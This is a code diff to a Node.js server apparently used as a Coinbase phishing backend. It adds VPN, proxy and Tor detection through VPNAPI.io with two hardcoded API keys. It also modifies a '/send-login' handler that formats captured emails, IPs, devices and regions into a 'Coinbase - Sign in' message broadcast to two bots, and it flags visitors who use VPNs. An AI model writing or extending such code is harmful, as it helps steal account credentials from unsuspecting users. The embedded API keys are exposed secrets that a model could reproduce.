@@ -20,10 +20,114 @@ app.use(cors());
 app.use(bodyParser.json());
 
 // ============================================================================
-// ✅ HELPER FUNCTIONS
+// ✅ VPNAPI.io VPN Detection Integration - DUAL KEY FALLBACK
+// ============================================================================
+const VPNAPI_KEY_PRIMARY = '39fda4fa1e1b4566a8eb5b9159ca9cec';
+const VPNAPI_KEY_SECONDARY = 'd96c4c195e7441368a3dfdf481a36ccc';
+const VPNAPI_ENDPOINT = 'https://vpnapi.io/api';
+
+/**
+ * Check if an IP is using VPN with VPNAPI.io (dual key fallback)
+ * @param {string} ip - IP address to check
+ * @returns {Promise<object>} VPN detection result
+ */
+async function checkVpnWithVPNAPI(ip) {
+  let lastError = null;
+  
+  // Try PRIMARY key first
+  try {
+    const response = await fetch(`${VPNAPI_ENDPOINT}/${ip}?key=${VPNAPI_KEY_PRIMARY}`);
+    const data = await response.json();
+    
+    // Check if quota exceeded (429 response or error message in response)
+    if (response.status === 429 || data.error?.includes('exceeded')) {
+      console.warn(`⚠️ PRIMARY key quota exceeded, trying secondary key...`);
+      lastError = 'quota_exceeded_primary';
+    } else if (!response.ok) {
+      console.warn(`⚠️ PRIMARY key failed (HTTP ${response.status}), trying secondary key...`);
+      lastError = `http_error_${response.status}`;
+    } else {
+      // Primary key worked
+      console.log(`✅ VPNAPI.io Check (PRIMARY) for ${ip}:`);
+      console.log(`   VPN: ${data.security?.vpn || false}`);
+      console.log(`   Proxy: ${data.security?.proxy || false}`);
+      console.log(`   Tor: ${data.security?.tor || false}`);
+      console.log(`   Relay: ${data.security?.relay || false}`);
+      
+      return {
+        ip: ip,
+        isVpn: data.security?.vpn || false,
+        isProxy: data.security?.proxy || false,
+        isTor: data.security?.tor || false,
+        isRelay: data.security?.relay || false,
+        apiUsed: 'primary'
+      };
+    }
+  } catch (err) {
+    console.warn(`⚠️ PRIMARY key exception: ${err.message}, trying secondary key...`);
+    lastError = err.message;
+  }
+  
+  // If primary failed, try SECONDARY key
+  try {
+    const response = await fetch(`${VPNAPI_ENDPOINT}/${ip}?key=${VPNAPI_KEY_SECONDARY}`);
+    const data = await response.json();
+    
+    if (response.status === 429 || data.error?.includes('exceeded')) {
+      console.error(`❌ SECONDARY key also quota exceeded - allowing user silently`);
+      return {
+        ip: ip,
+        isVpn: false,
+        isProxy: false,
+        isTor: false,
+        isRelay: false,
+        apiUsed: 'none',
+        allowedDueToApiFailure: true
+      };
+    } else if (!response.ok) {
+      console.error(`❌ SECONDARY key failed (HTTP ${response.status}) - allowing user silently`);
+      return {
+        ip: ip,
+        isVpn: false,
+        isProxy: false,
+        isTor: false,
+        isRelay: false,
+        apiUsed: 'none',
+        allowedDueToApiFailure: true
+      };
+    } else {
+      // Secondary key worked
+      console.log(`✅ VPNAPI.io Check (SECONDARY) for ${ip}:`);
+      console.log(`   VPN: ${data.security?.vpn || false}`);
+      console.log(`   Proxy: ${data.security?.proxy || false}`);
+      console.log(`   Tor: ${data.security?.tor || false}`);
+      console.log(`   Relay: ${data.security?.relay || false}`);
+      
+      return {
+        ip: ip,
+        isVpn: data.security?.vpn || false,
+        isProxy: data.security?.proxy || false,
+        isTor: data.security?.tor || false,
+        isRelay: data.security?.relay || false,
+        apiUsed: 'secondary'
+      };
+    }
+  } catch (err) {
+    console.error(`❌ SECONDARY key exception: ${err.message} - allowing user silently`);
+    return {
+      ip: ip,
+      isVpn: false,
+      isProxy: false,
+      isTor: false,
+      isRelay: false,
+      apiUsed: 'none',
+      allowedDueToApiFailure: true
+    };
+  }
+}
+
 // ============================================================================
 
-function getIP(req) {
   return (
     req.headers['cf-connecting-ip'] ||
     (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
@@ -273,10 +377,16 @@ app.post("/send-login", async (req, res) => {
     console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
     // ============================================================================
+    // ✅ VPN DETECTION
+    // ============================================================================
+    const vpnCheck = await checkVpnWithVPNAPI(ip);
+    console.log(`🎭 VPN Check Result for ${ip}: VPN=${vpnCheck.isVpn}, Proxy=${vpnCheck.isProxy}, Tor=${vpnCheck.isTor}, Relay=${vpnCheck.isRelay} (API: ${vpnCheck.apiUsed})`);
+
+    // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
     // ============================================================================
 
-    const message =
+    let message =
       `😈😈😈😈 <b>Coinbase - Sign in</b> 😈😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
@@ -284,6 +394,11 @@ app.post("/send-login", async (req, res) => {
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
+
+    // ✅ Add VPN detection line if any threat detected
+    if (vpnCheck.isVpn || vpnCheck.isProxy || vpnCheck.isTor || vpnCheck.isRelay) {
+      message += `\n<b>🎭 VPN - Detected!</b>`;
+    }
 
     const options = {
       parse_mode: "HTML",
